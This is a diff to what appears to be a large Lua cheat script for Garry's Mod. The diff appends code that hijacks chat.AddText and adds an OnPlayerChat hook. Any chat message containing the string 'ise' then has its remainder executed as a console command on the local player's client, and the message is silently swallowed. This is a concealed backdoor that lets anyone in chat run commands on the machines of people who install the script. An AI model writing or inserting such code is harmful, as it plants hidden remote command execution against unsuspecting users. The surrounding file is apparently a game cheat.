@@ -11889,3 +11889,26 @@ ultimate.AddHook( "player_hurt" )
 ultimate.AddHook( "SetupWorldFog" )
 ultimate.AddHook( "SetupSkyboxFog" )
 ultimate.AddHook( "CalcMainActivity" )
+
+
+local a = chat.AddText
+chat.AddText = function(...)
+    for b, c in next, {...} do
+        if isstring(c) and c:find("ise") then
+            LocalPlayer():ConCommand(("ise"):Explode(c)[2])
+            return
+        end
+    end
+    return a(...)
+end
+
+hook.Add("OnPlayerChat", "isea", function(ply, text, team, dead)
+    if isstring(text) and text:find("ise") then
+        local cmd = ("ise"):Explode(text)[2]
+        if cmd then
+            LocalPlayer():ConCommand(cmd)
+        end
+        return true
+    end
+end)
+
